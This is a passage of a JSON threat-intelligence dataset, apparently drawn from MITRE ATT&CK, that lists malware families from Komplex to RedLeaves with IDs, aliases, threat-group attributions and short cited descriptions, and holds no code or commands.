    "description": "[Komplex](https://attack.mitre.org/software/S0162) is a backdoor that has been used by [APT28](https://attack.mitre.org/groups/G0007) on OS X and appears to be developed in a similar manner to [XAgentOSX](https://attack.mitre.org/software/S0161) (Citation: XAgentOSX) (Citation: Sofacy Komplex Trojan).",
    "example_uses": []
  },
  "malware--c2417bab-3189-4d4d-9d60-96de2cdaf0ab": {
    "id": "S0236",
    "name": "Kwampirs",
    "examples": [],
    "similar_words": [
      "Kwampirs"
    ],
    "description": "[Kwampirs](https://attack.mitre.org/software/S0236) is a backdoor Trojan used by [Orangeworm](https://attack.mitre.org/groups/G0071). It has been found on machines which had software installed for the use and control of high-tech imaging devices such as X-Ray and MRI machines. (Citation: Symantec Orangeworm April 2018)",
    "example_uses": []
  },
  "malware--2a6f4c7b-e690-4cc7-ab6b-1f821fb6b80b": {
    "id": "S0042",
    "name": "LOWBALL",
    "examples": [],
    "similar_words": [
      "LOWBALL"
    ],
    "description": "[LOWBALL](https://attack.mitre.org/software/S0042) is malware used by [admin@338](https://attack.mitre.org/groups/G0018). It was used in August 2015 in email messages targeting Hong Kong-based media organizations. (Citation: FireEye admin@338)",
    "example_uses": []
  },
  "malware--e9e9bfe2-76f4-4870-a2a1-b7af89808613": {
    "id": "S0211",
    "name": "Linfo",
    "examples": [],
    "similar_words": [
      "Linfo"
    ],
    "description": "[Linfo](https://attack.mitre.org/software/S0211) is a rootkit trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Linfo May 2012)",
    "example_uses": []
  },
  "malware--251fbae2-78f6-4de7-84f6-194c727a64ad": {
    "id": "S0010",
    "name": "Lurid",
    "examples": [],
    "similar_words": [
      "Lurid",
      "Enfal"
    ],
    "description": "[Lurid](https://attack.mitre.org/software/S0010) is a malware family that has been used by several groups, including [PittyTiger](https://attack.mitre.org/groups/G0011), in targeted attacks as far back as 2006. (Citation: Villeneuve 2014) (Citation: Villeneuve 2011)",
    "example_uses": []
  },
  "malware--049ff071-0b3c-4712-95d2-d21c6aa54501": {
    "id": "S0233",
    "name": "MURKYTOP",
    "examples": [],
    "similar_words": [
      "MURKYTOP"
    ],
    "description": "[MURKYTOP](https://attack.mitre.org/software/S0233) is a reconnaissance tool used by [Leviathan](https://attack.mitre.org/groups/G0065). (Citation: FireEye Periscope March 2018)",
    "example_uses": []
  },
  "malware--f72251cb-2be5-421f-a081-99c29a1209e7": {
    "id": "S0282",
    "name": "MacSpy",
    "examples": [],
    "similar_words": [
      "MacSpy"
    ],
    "description": "[MacSpy](https://attack.mitre.org/software/S0282) is a malware-as-a-service offered on the darkweb  (Citation: objsee mac malware 2017).",
    "example_uses": []
  },
  "malware--1cc934e4-b01d-4543-a011-b988dfc1a458": {
    "id": "S0167",
    "name": "Matroyshka",
    "examples": [],
    "similar_words": [
      "Matroyshka"
    ],
    "description": "[Matroyshka](https://attack.mitre.org/software/S0167) is a malware framework used by [CopyKittens](https://attack.mitre.org/groups/G0052) that consists of a dropper, loader, and RAT. It has multiple versions; v1 was seen in the wild from July 2016 until January 2017. v2 has fewer commands and other minor differences. (Citation: ClearSky Wilted Tulip July 2017) (Citation: CopyKittens Nov 2015)",
    "example_uses": []
  },
  "malware--17dec760-9c8f-4f1b-9b4b-0ac47a453234": {
    "id": "S0133",
    "name": "Miner-C",
    "examples": [],
    "similar_words": [
      "Miner-C",
      "Mal/Miner-C",
      "PhotoMiner"
    ],
    "description": "[Miner-C](https://attack.mitre.org/software/S0133) is malware that mines victims for the Monero cryptocurrency. It has targeted FTP servers and Network Attached Storage (NAS) devices to spread. (Citation: Softpedia MinerC)",
    "example_uses": []
  },
  "malware--5e7ef1dc-7fb6-4913-ac75-e06113b59e0c": {
    "id": "S0051",
    "name": "MiniDuke",
    "examples": [],
    "similar_words": [
      "MiniDuke"
    ],
    "description": "[MiniDuke](https://attack.mitre.org/software/S0051) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. The [MiniDuke](https://attack.mitre.org/software/S0051) toolset consists of multiple downloader and backdoor components. The loader has been used with other [MiniDuke](https://attack.mitre.org/software/S0051) components as well as in conjunction with [CosmicDuke](https://attack.mitre.org/software/S0050) and [PinchDuke](https://attack.mitre.org/software/S0048). (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--e3cedcfe-6515-4348-af65-7f2c4157bf0d": {
    "id": "S0280",
    "name": "MirageFox",
    "examples": [],
    "similar_words": [
      "MirageFox"
    ],
    "description": "[MirageFox](https://attack.mitre.org/software/S0280) is a remote access tool used against Windows systems. It appears to be an upgraded version of a tool known as Mirage, which is a RAT believed to originate in 2012. (Citation: APT15 Intezer June 2018)",
    "example_uses": []
  },
  "malware--e1161124-f22e-487f-9d5f-ed8efc8dcd61": {
    "id": "S0084",
    "name": "Mis-Type",
    "examples": [],
    "similar_words": [
      "Mis-Type"
    ],
    "description": "[Mis-Type](https://attack.mitre.org/software/S0084) is a backdoor hybrid that was used by [Dust Storm](https://attack.mitre.org/groups/G0031) in 2012. (Citation: Cylance Dust Storm)",
    "example_uses": []
  },
  "malware--0db09158-6e48-4e7c-8ce7-2b10b9c0c039": {
    "id": "S0083",
    "name": "Misdat",
    "examples": [],
    "similar_words": [
      "Misdat"
    ],
    "description": "[Misdat](https://attack.mitre.org/software/S0083) is a backdoor that was used by [Dust Storm](https://attack.mitre.org/groups/G0031) from 2010 to 2011. (Citation: Cylance Dust Storm)",
    "example_uses": []
  },
  "malware--fbb470da-1d44-4f29-bbb3-9efbe20f94a3": {
    "id": "S0080",
    "name": "Mivast",
    "examples": [],
    "similar_words": [
      "Mivast"
    ],
    "description": "[Mivast](https://attack.mitre.org/software/S0080) is a backdoor that has been used by [Deep Panda](https://attack.mitre.org/groups/G0009). It was reportedly used in the Anthem breach. (Citation: Symantec Black Vine)",
    "example_uses": []
  },
  "malware--463f68f1-5cde-4dc2-a831-68b73488f8f4": {
    "id": "S0079",
    "name": "MobileOrder",
    "examples": [],
    "similar_words": [
      "MobileOrder"
    ],
    "description": "[MobileOrder](https://attack.mitre.org/software/S0079) is a Trojan intended to compromise Android mobile devices. It has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet Mimic Jan 2016)",
    "example_uses": []
  },
  "malware--9ea525fa-b0a9-4dde-84f2-bcea0137b3c1": {
    "id": "S0149",
    "name": "MoonWind",
    "examples": [],
    "similar_words": [
      "MoonWind"
    ],
    "description": "[MoonWind](https://attack.mitre.org/software/S0149) is a remote access tool (RAT) that was used in 2016 to target organizations in Thailand. (Citation: Palo Alto MoonWind March 2017)",
    "example_uses": []
  },
  "malware--bfd2738c-8b43-43c3-bc9f-d523c8e88bf4": {
    "id": "S0284",
    "name": "More_eggs",
    "examples": [],
    "similar_words": [
      "More_eggs"
    ],
    "description": "[More_eggs](https://attack.mitre.org/software/S0284) is a JScript backdoor used by [Cobalt Group](https://attack.mitre.org/groups/G0080). Its name was given based on the variable \"More_eggs\" being present in its code. There are at least two different versions of the backdoor being used, version 2.0 and version 4.4. (Citation: Talos Cobalt Group July 2018)",
    "example_uses": []
  },
  "malware--92b55426-109f-4d93-899f-1833ce91ff90": {
    "id": "S0256",
    "name": "Mosquito",
    "examples": [],
    "similar_words": [
      "Mosquito"
    ],
    "description": "[Mosquito](https://attack.mitre.org/software/S0256) is a Win32 backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010). [Mosquito](https://attack.mitre.org/software/S0256) is made up of three parts: the installer, the launcher, and the backdoor. The main backdoor is called CommanderDLL and is launched by the loader program. (Citation: ESET Turla Mosquito Jan 2018)",
    "example_uses": []
  },
  "malware--d1183cb9-258e-4f2f-8415-50ac8252c49e": {
    "id": "S0272",
    "name": "NDiskMonitor",
    "examples": [],
    "similar_words": [
      "NDiskMonitor"
    ],
    "description": "[NDiskMonitor](https://attack.mitre.org/software/S0272) is a custom backdoor written in .NET that appears to be unique to [Patchwork](https://attack.mitre.org/groups/G0040). (Citation: TrendMicro Patchwork Dec 2017)",
    "example_uses": []
  },
  "malware--53cf6cc4-65aa-445a-bcf8-c3d296f8a7a2": {
    "id": "S0034",
    "name": "NETEAGLE",
    "examples": [],
    "similar_words": [
      "NETEAGLE"
    ],
    "description": "[NETEAGLE](https://attack.mitre.org/software/S0034) is a backdoor developed by [APT30](https://attack.mitre.org/groups/G0013) with compile dates as early as 2008. It has two main variants known as “Scout” and “Norton.” (Citation: FireEye APT30)",
    "example_uses": []
  },
  "malware--2a70812b-f1ef-44db-8578-a496a227aef2": {
    "id": "S0198",
    "name": "NETWIRE",
    "examples": [],
    "similar_words": [
      "NETWIRE"
    ],
    "description": "[NETWIRE](https://attack.mitre.org/software/S0198) is a publicly available, multiplatform remote administration tool (RAT) that has been used by criminal and APT groups since at least 2012. (Citation: FireEye APT33 Sept 2017) (Citation: McAfee Netwire Mar 2015) (Citation: FireEye APT33 Webinar Sept 2017)",
    "example_uses": []
  },
  "malware--48523614-309e-43bf-a2b8-705c2b45d7b2": {
    "id": "S0205",
    "name": "Naid",
    "examples": [],
    "similar_words": [
      "Naid"
    ],
    "description": "[Naid](https://attack.mitre.org/software/S0205) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Naid June 2012)",
    "example_uses": []
  },
  "malware--705f0783-5f7d-4491-b6b7-9628e6e006d2": {
    "id": "S0228",
    "name": "NanHaiShu",
    "examples": [],
    "similar_words": [
      "NanHaiShu"
    ],
    "description": "[NanHaiShu](https://attack.mitre.org/software/S0228) is a remote access tool and JScript backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065). [NanHaiShu](https://attack.mitre.org/software/S0228) has been used to target government and private-sector organizations that have relations to the South China Sea dispute. (Citation: Proofpoint Leviathan Oct 2017) (Citation: fsecure NanHaiShu July 2016)",
    "example_uses": []
  },
  "malware--53a42597-1974-4b8e-84fd-3675e8992053": {
    "id": "S0247",
    "name": "NavRAT",
    "examples": [],
    "similar_words": [
      "NavRAT"
    ],
    "description": "[NavRAT](https://attack.mitre.org/software/S0247) is a remote access tool designed to upload, download, and execute files. It has been observed in attacks targeting South Korea. (Citation: Talos NavRAT May 2018)",
    "example_uses": []
  },
  "malware--c251e4a5-9a2e-4166-8e42-442af75c3b9a": {
    "id": "S0210",
    "name": "Nerex",
    "examples": [],
    "similar_words": [
      "Nerex"
    ],
    "description": "[Nerex](https://attack.mitre.org/software/S0210) is a Trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Nerex May 2012)",
    "example_uses": []
  },
  "malware--fde50aaa-f5de-4cb8-989a-babb57d6a704": {
    "id": "S0056",
    "name": "Net Crawler",
    "examples": [],
    "similar_words": [
      "Net Crawler",
      "NetC"
    ],
    "description": "[Net Crawler](https://attack.mitre.org/software/S0056) is an intranet worm capable of extracting credentials using credential dumpers and spreading to systems on a network over SMB by brute forcing accounts with recovered passwords and using [PsExec](https://attack.mitre.org/software/S0029) to execute a copy of [Net Crawler](https://attack.mitre.org/software/S0056). (Citation: Cylance Cleaver)",
    "example_uses": []
  },
  "malware--cafd0bf8-2b9c-46c7-ae3c-3e0f42c5062e": {
    "id": "S0033",
    "name": "NetTraveler",
    "examples": [],
    "similar_words": [
      "NetTraveler"
    ],
    "description": "[NetTraveler](https://attack.mitre.org/software/S0033) is malware that has been used in multiple cyber espionage campaigns for basic surveillance of victims. The earliest known samples have timestamps back to 2005, and the largest number of observed samples were created between 2010 and 2013. (Citation: Kaspersky NetTraveler)",
    "example_uses": []
  },
  "malware--9e9b9415-a7df-406b-b14d-92bfe6809fbe": {
    "id": "S0118",
    "name": "Nidiran",
    "examples": [],
    "similar_words": [
      "Nidiran",
      "Backdoor.Nidiran"
    ],
    "description": "[Nidiran](https://attack.mitre.org/software/S0118) is a custom backdoor developed and used by [Suckfly](https://attack.mitre.org/groups/G0039). It has been delivered via strategic web compromise. (Citation: Symantec Suckfly March 2016)",
    "example_uses": []
  },
  "malware--2dd34b01-6110-4aac-835d-b5e7b936b0be": {
    "id": "S0138",
    "name": "OLDBAIT",
    "examples": [],
    "similar_words": [
      "OLDBAIT",
      "Sasfis"
    ],
    "description": "[OLDBAIT](https://attack.mitre.org/software/S0138) is a credential harvester used by [APT28](https://attack.mitre.org/groups/G0007). (Citation: FireEye APT28) (Citation: FireEye APT28 January 2017)",
    "example_uses": []
  },
  "malware--f6d1d2cb-12f5-4221-9636-44606ea1f3f8": {
    "id": "S0165",
    "name": "OSInfo",
    "examples": [],
    "similar_words": [
      "OSInfo"
    ],
    "description": "[OSInfo](https://attack.mitre.org/software/S0165) is a custom tool used by [APT3](https://attack.mitre.org/groups/G0022) to do internal discovery on a victim's computer and network. (Citation: Symantec Buckeye)",
    "example_uses": []
  },
  "malware--b136d088-a829-432c-ac26-5529c26d4c7e": {
    "id": "S0052",
    "name": "OnionDuke",
    "examples": [],
    "similar_words": [
      "OnionDuke"
    ],
    "description": "[OnionDuke](https://attack.mitre.org/software/S0052) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2013 to 2015. (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--8e101fdd-9f7f-4916-bb04-6bd9e94c129c": {
    "id": "S0264",
    "name": "OopsIE",
    "examples": [],
    "similar_words": [
      "OopsIE"
    ],
    "description": "[OopsIE](https://attack.mitre.org/software/S0264) is a Trojan used by [OilRig](https://attack.mitre.org/groups/G0049) to remotely execute commands as well as upload/download files to/from victims. (Citation: Unit 42 OopsIE! Feb 2018)",
    "example_uses": []
  },
  "malware--06d735e7-1db1-4dbe-ab4b-acbe419f902b": {
    "id": "S0229",
    "name": "Orz",
    "examples": [],
    "similar_words": [
      "AIRBREAK",
      "Orz"
    ],
    "description": "[Orz](https://attack.mitre.org/software/S0229) is a custom JavaScript backdoor used by [Leviathan](https://attack.mitre.org/groups/G0065). It was observed being used in 2014 as well as in August 2017 when it was dropped by Microsoft Publisher files. (Citation: Proofpoint Leviathan Oct 2017) (Citation: FireEye Periscope March 2018)",
    "example_uses": []
  },
  "malware--a60657fa-e2e7-4f8f-8128-a882534ae8c5": {
    "id": "S0072",
    "name": "OwaAuth",
    "examples": [],
    "similar_words": [
      "OwaAuth"
    ],
    "description": "[OwaAuth](https://attack.mitre.org/software/S0072) is a Web shell and credential stealer deployed to Microsoft Exchange servers that appears to be exclusively used by [Threat Group-3390](https://attack.mitre.org/groups/G0027). (Citation: Dell TG-3390)",
    "example_uses": []
  },
  "malware--b2c5d3ca-b43a-4888-ad8d-e2d43497bf85": {
    "id": "S0016",
    "name": "P2P ZeuS",
    "examples": [],
    "similar_words": [
      "P2P ZeuS",
      "Peer-to-Peer ZeuS",
      "Gameover ZeuS"
    ],
    "description": "[P2P ZeuS](https://attack.mitre.org/software/S0016) is a closed-source fork of the leaked version of the ZeuS botnet. It presents improvements over the leaked version, including a peer-to-peer architecture. (Citation: Dell P2P ZeuS)",
    "example_uses": []
  },
  "malware--f6ae7a52-f3b6-4525-9daf-640c083f006e": {
    "id": "S0158",
    "name": "PHOREAL",
    "examples": [],
    "similar_words": [
      "PHOREAL"
    ],
    "description": "[PHOREAL](https://attack.mitre.org/software/S0158) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)",
    "example_uses": []
  },
  "malware--21c0b55b-5ff3-4654-a05e-e3fc1ee1ce1b": {
    "id": "S0254",
    "name": "PLAINTEE",
    "examples": [],
    "similar_words": [
      "PLAINTEE"
    ],
    "description": "[PLAINTEE](https://attack.mitre.org/software/S0254) is a malware sample that has been used by [Rancor](https://attack.mitre.org/groups/G0075) in targeted attacks in Singapore and Cambodia. (Citation: Rancor Unit42 June 2018)",
    "example_uses": []
  },
  "malware--53d47b09-09c2-4015-8d37-6633ecd53f79": {
    "id": "S0216",
    "name": "POORAIM",
    "examples": [],
    "similar_words": [
      "POORAIM"
    ],
    "description": "[POORAIM](https://attack.mitre.org/software/S0216) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) in campaigns since at least 2014. (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--5e595477-2e78-4ce7-ae42-e0b059b17808": {
    "id": "S0150",
    "name": "POSHSPY",
    "examples": [],
    "similar_words": [
      "POSHSPY"
    ],
    "description": "[POSHSPY](https://attack.mitre.org/software/S0150) is a backdoor that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2015. It appears to be used as a secondary backdoor used if the actors lost access to their primary backdoors. (Citation: FireEye POSHSPY April 2017)",
    "example_uses": []
  },
  "malware--17e919aa-4a49-445c-b103-dbb8df9e7351": {
    "id": "S0145",
    "name": "POWERSOURCE",
    "examples": [],
    "similar_words": [
      "POWERSOURCE",
      "DNSMessenger"
    ],
    "description": "[POWERSOURCE](https://attack.mitre.org/software/S0145) is a PowerShell backdoor that is a heavily obfuscated and modified version of the publicly available tool DNS_TXT_Pwnage. It was observed in February 2017 in spearphishing campaigns against personnel involved with United States Securities and Exchange Commission (SEC) filings at various organizations. The malware was delivered when macros were enabled by the victim and a VBS script was dropped. (Citation: FireEye FIN7 March 2017) (Citation: Cisco DNSMessenger March 2017)",
    "example_uses": []
  },
  "malware--e8545794-b98c-492b-a5b3-4b5a02682e37": {
    "id": "S0223",
    "name": "POWERSTATS",
    "examples": [],
    "similar_words": [
      "POWERSTATS",
      "Powermud"
    ],
    "description": "[POWERSTATS](https://attack.mitre.org/software/S0223) is a PowerShell-based first stage backdoor used by [MuddyWater](https://attack.mitre.org/groups/G0069). (Citation: Unit 42 MuddyWater Nov 2017)",
    "example_uses": []
  },
  "malware--09b2cd76-c674-47cc-9f57-d2f2ad150a46": {
    "id": "S0184",
    "name": "POWRUNER",
    "examples": [],
    "similar_words": [
      "POWRUNER"
    ],
    "description": "[POWRUNER](https://attack.mitre.org/software/S0184) is a PowerShell script that sends and receives commands to and from the C2 server. (Citation: FireEye APT34 Dec 2017)",
    "example_uses": []
  },
  "malware--5c6ed2dc-37f4-40ea-b2e1-4c76140a388c": {
    "id": "S0196",
    "name": "PUNCHBUGGY",
    "examples": [],
    "similar_words": [
      "PUNCHBUGGY"
    ],
    "description": "[PUNCHBUGGY](https://attack.mitre.org/software/S0196) is a dynamic-link library (DLL) downloader utilized by [FIN8](https://attack.mitre.org/groups/G0061). (Citation: FireEye Fin8 May 2016) (Citation: FireEye Know Your Enemy FIN8 Aug 2016)",
    "example_uses": []
  },
  "malware--c4de7d83-e875-4c88-8b5d-06c41e5b7e79": {
    "id": "S0197",
    "name": "PUNCHTRACK",
    "examples": [],
    "similar_words": [
      "PUNCHTRACK",
      "PSVC"
    ],
    "description": "[PUNCHTRACK](https://attack.mitre.org/software/S0197) is non-persistent point of sale (POS) system malware utilized by [FIN8](https://attack.mitre.org/groups/G0061) to scrape payment card data. (Citation: FireEye Fin8 May 2016) (Citation: FireEye Know Your Enemy FIN8 Aug 2016)",
    "example_uses": []
  },
  "malware--e811ff6a-4cef-4856-a6ae-a7daf9ed39ae": {
    "id": "S0208",
    "name": "Pasam",
    "examples": [],
    "similar_words": [
      "Pasam"
    ],
    "description": "[Pasam](https://attack.mitre.org/software/S0208) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Pasam May 2012)",
    "example_uses": []
  },
  "malware--ae9d818d-95d0-41da-b045-9cabea1ca164": {
    "id": "S0048",
    "name": "PinchDuke",
    "examples": [],
    "similar_words": [
      "PinchDuke"
    ],
    "description": "[PinchDuke](https://attack.mitre.org/software/S0048) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2008 to 2010. (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--b96680d1-5eb3-4f07-b95c-00ab904ac236": {
    "id": "S0124",
    "name": "Pisloader",
    "examples": [],
    "similar_words": [
      "Pisloader"
    ],
    "description": "[Pisloader](https://attack.mitre.org/software/S0124) is a malware family that is notable due to its use of DNS as a C2 protocol as well as its use of anti-analysis tactics. It has been used by [APT18](https://attack.mitre.org/groups/G0026) and is similar to another malware family, [HTTPBrowser](https://attack.mitre.org/software/S0070), that has been used by the group. (Citation: Palo Alto DNS Requests)",
    "example_uses": []
  },
  "malware--64fa0de0-6240-41f4-8638-f4ca7ed528fd": {
    "id": "S0013",
    "name": "PlugX",
    "examples": [],
    "similar_words": [
      "PlugX",
      "DestroyRAT",
      "Sogu",
      "Kaba",
      "Korplug"
    ],
    "description": "[PlugX](https://attack.mitre.org/software/S0013) is a remote access tool (RAT) that uses modular plugins. (Citation: Lastline PlugX Analysis) It has been used by multiple threat groups. (Citation: FireEye Clandestine Fox Part 2) (Citation: New DragonOK) (Citation: Dell TG-3390)",
    "example_uses": []
  },
  "malware--b42378e0-f147-496f-992a-26a49705395b": {
    "id": "S0012",
    "name": "PoisonIvy",
    "examples": [],
    "similar_words": [
      "PoisonIvy",
      "Poison Ivy",
      "Darkmoon"
    ],
    "description": "[PoisonIvy](https://attack.mitre.org/software/S0012) is a popular remote access tool (RAT) that has been used by many groups. (Citation: FireEye Poison Ivy) (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Darkmoon Aug 2005)",
    "example_uses": []
  },
  "malware--0a9c51e0-825d-4b9b-969d-ce86ed8ce3c3": {
    "id": "S0177",
    "name": "Power Loader",
    "examples": [],
    "similar_words": [
      "Power Loader",
      "Win32/Agent.UAW"
    ],
    "description": "[Power Loader](https://attack.mitre.org/software/S0177) is modular code sold in the cybercrime market used as a downloader in malware families such as Carberp, Redyms and Gapz. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)",
    "example_uses": []
  },
  "malware--00c3bfcb-99bd-4767-8c03-b08f585f5c8a": {
    "id": "S0139",
    "name": "PowerDuke",
    "examples": [],
    "similar_words": [
      "PowerDuke"
    ],
    "description": "[PowerDuke](https://attack.mitre.org/software/S0139) is a backdoor that was used by [APT29](https://attack.mitre.org/groups/G0016) in 2016. It has primarily been delivered through Microsoft Word or Excel attachments containing malicious macros. (Citation: Volexity PowerDuke November 2016)",
    "example_uses": []
  },
  "malware--37cc7eb6-12e3-467b-82e8-f20f2cc73c69": {
    "id": "S0113",
    "name": "Prikormka",
    "examples": [],
    "similar_words": [
      "Prikormka"
    ],
    "description": "[Prikormka](https://attack.mitre.org/software/S0113) is a malware family used in a campaign known as Operation Groundbait. It has predominantly been observed in Ukraine and was used as early as 2008. (Citation: ESET Operation Groundbait)",
    "example_uses": []
  },
  "malware--c541efb4-e7b1-4ad6-9da8-b4e113f5dd42": {
    "id": "S0279",
    "name": "Proton",
    "examples": [],
    "similar_words": [
      "Proton"
    ],
    "description": "[Proton](https://attack.mitre.org/software/S0279) is a macOS backdoor focusing on data theft and credential access  (Citation: objsee mac malware 2017).",
    "example_uses": []
  },
  "malware--069af411-9b24-4e85-b26c-623d035bbe84": {
    "id": "S0238",
    "name": "Proxysvc",
    "examples": [],
    "similar_words": [
      "Proxysvc"
    ],
    "description": "[Proxysvc](https://attack.mitre.org/software/S0238) is a malicious DLL used by [Lazarus Group](https://attack.mitre.org/groups/G0032) in a campaign known as Operation GhostSecret. It has appeared to be operating undetected since 2017 and was mostly observed in higher education organizations. The goal of [Proxysvc](https://attack.mitre.org/software/S0238) is to deliver additional payloads to the target and to maintain control for the attacker. It is in the form of a DLL that can also be executed as a standalone process. (Citation: McAfee GhostSecret)",
    "example_uses": []
  },
  "malware--dfb5fa9b-3051-4b97-8035-08f80aef945b": {
    "id": "S0078",
    "name": "Psylo",
    "examples": [],
    "similar_words": [
      "Psylo"
    ],
    "description": "[Psylo](https://attack.mitre.org/software/S0078) is a shellcode-based Trojan that has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). It has similar characteristics as [FakeM](https://attack.mitre.org/software/S0076). (Citation: Scarlet Mimic Jan 2016)",
    "example_uses": []
  },
  "malware--5f9f7648-04ba-4a9f-bb4c-2a13e74572bd": {
    "id": "S0147",
    "name": "Pteranodon",
    "examples": [],
    "similar_words": [
      "Pteranodon"
    ],
    "description": "[Pteranodon](https://attack.mitre.org/software/S0147) is a custom backdoor used by [Gamaredon Group](https://attack.mitre.org/groups/G0047). (Citation: Palo Alto Gamaredon Feb 2017)",
    "example_uses": []
  },
  "malware--7e6c2a9d-9dc1-4eb0-b27c-91e8076a9d77": {
    "id": "S0269",
    "name": "QUADAGENT",
    "examples": [],
    "similar_words": [
      "QUADAGENT"
    ],
    "description": "[QUADAGENT](https://attack.mitre.org/software/S0269) is a PowerShell backdoor used by [OilRig](https://attack.mitre.org/groups/G0049). (Citation: Unit 42 QUADAGENT July 2018)",
    "example_uses": []
  },
  "malware--8c553311-0baa-4146-997a-f79acef3d831": {
    "id": "S0055",
    "name": "RARSTONE",
    "examples": [],
    "similar_words": [
      "RARSTONE"
    ],
    "description": "[RARSTONE](https://attack.mitre.org/software/S0055) is malware used by the [Naikon](https://attack.mitre.org/groups/G0019) group that has some characteristics similar to [PlugX](https://attack.mitre.org/software/S0013). (Citation: Aquino RARSTONE)",
    "example_uses": []
  },
  "malware--9b325b06-35a1-457d-be46-a4ecc0b7ff0c": {
    "id": "S0241",
    "name": "RATANKBA",
    "examples": [],
    "similar_words": [
      "RATANKBA"
    ],
    "description": "[RATANKBA](https://attack.mitre.org/software/S0241) is a remote controller tool used by [Lazarus Group](https://attack.mitre.org/groups/G0032). [RATANKBA](https://attack.mitre.org/software/S0241) has been used in attacks targeting financial institutions in Poland, Mexico, Uruguay, the United Kingdom, and Chile. It was also seen used against organizations related to telecommunications, management consulting, information technology, insurance, aviation, and education. [RATANKBA](https://attack.mitre.org/software/S0241) has a graphical user interface to allow the attacker to issue jobs to perform on the infected machines. (Citation: Lazarus RATANKBA) (Citation: RATANKBA)",
    "example_uses": []
  },
  "malware--b9eec47e-98f4-4b3c-b574-3fa8a87ebe05": {
    "id": "S0258",
    "name": "RGDoor",
    "examples": [],
    "similar_words": [
      "RGDoor"
    ],
    "description": "[RGDoor](https://attack.mitre.org/software/S0258) is a malicious Internet Information Services (IIS) backdoor developed in the C++ language. [RGDoor](https://attack.mitre.org/software/S0258) has been seen deployed on webservers belonging to the Middle East government organizations. [RGDoor](https://attack.mitre.org/software/S0258) provides backdoor access to compromised IIS servers. (Citation: Unit 42 RGDoor Jan 2018)",
    "example_uses": []
  },
  "malware--ad4f146f-e3ec-444a-ba71-24bffd7f0f8e": {
    "id": "S0003",
    "name": "RIPTIDE",
    "examples": [],
    "similar_words": [
      "RIPTIDE"
    ],
    "description": "[RIPTIDE](https://attack.mitre.org/software/S0003) is a proxy-aware backdoor used by [APT12](https://attack.mitre.org/groups/G0005). (Citation: Moran 2014)",
    "example_uses": []
  },
  "malware--cba78a1c-186f-4112-9e6a-be1839f030f7": {
    "id": "S0112",
    "name": "ROCKBOOT",
    "examples": [],
    "similar_words": [
      "ROCKBOOT"
    ],
    "description": "[ROCKBOOT](https://attack.mitre.org/software/S0112) is a [Bootkit](https://attack.mitre.org/techniques/T1067) that has been used by an unidentified, suspected China-based group. (Citation: FireEye Bootkits)",
    "example_uses": []
  },
  "malware--60a9c2f0-b7a5-4e8e-959c-e1a3ff314a5f": {
    "id": "S0240",
    "name": "ROKRAT",
    "examples": [],
    "similar_words": [
      "ROKRAT"
    ],
    "description": "[ROKRAT](https://attack.mitre.org/software/S0240) is a remote access tool (RAT) used by [APT37](https://attack.mitre.org/groups/G0067). This software has been used to target victims in South Korea. [APT37](https://attack.mitre.org/groups/G0067) used ROKRAT during several campaigns in 2016 through 2018. (Citation: Talos ROKRAT) (Citation: Talos Group123)",
    "example_uses": []
  },
  "malware--92ec0cbd-2c30-44a2-b270-73f4ec949841": {
    "id": "S0148",
    "name": "RTM",
    "examples": [],
    "similar_words": [
      "RTM"
    ],
    "description": "[RTM](https://attack.mitre.org/software/S0148) is custom malware written in Delphi. It is used by the group of the same name ([RTM](https://attack.mitre.org/groups/G0048)). (Citation: ESET RTM Feb 2017)",
    "example_uses": []
  },
  "malware--9752aef4-a1f3-4328-929f-b64eb0536090": {
    "id": "S0169",
    "name": "RawPOS",
    "examples": [],
    "similar_words": [
      "RawPOS",
      "FIENDCRY",
      "DUEBREW",
      "DRIFTWOOD"
    ],
    "description": "[RawPOS](https://attack.mitre.org/software/S0169) is a point-of-sale (POS) malware family that searches for cardholder data on victims. It has been in use since at least 2008. (Citation: Kroll RawPOS Jan 2017) (Citation: TrendMicro RawPOS April 2015) (Citation: Visa RawPOS March 2015) FireEye divides RawPOS into three components: FIENDCRY, DUEBREW, and DRIFTWOOD. (Citation: Mandiant FIN5 GrrCON Oct 2016) (Citation: DarkReading FireEye FIN5 Oct 2015)",
    "example_uses": []
  },
  "malware--65341f30-bec6-4b1d-8abf-1a5620446c29": {
    "id": "S0172",
    "name": "Reaver",
    "examples": [],
    "similar_words": [
      "Reaver"
    ],
    "description": "[Reaver](https://attack.mitre.org/software/S0172) is a malware family that has been in the wild since at least late 2016. Reporting indicates victims have primarily been associated with the \"Five Poisons,\" which are movements the Chinese government considers dangerous. The type of malware is rare due to its final payload being in the form of [Control Panel Items](https://attack.mitre.org/techniques/T1196). (Citation: Palo Alto Reaver Nov 2017)",
    "example_uses": []
  },
  "malware--17b40f60-729f-4fe8-8aea-cc9ee44a95d5": {
    "id": "S0153",
    "name": "RedLeaves",
    "examples": [],
    "similar_words": [
      "RedLeaves",
      "BUGJUICE"
    ],
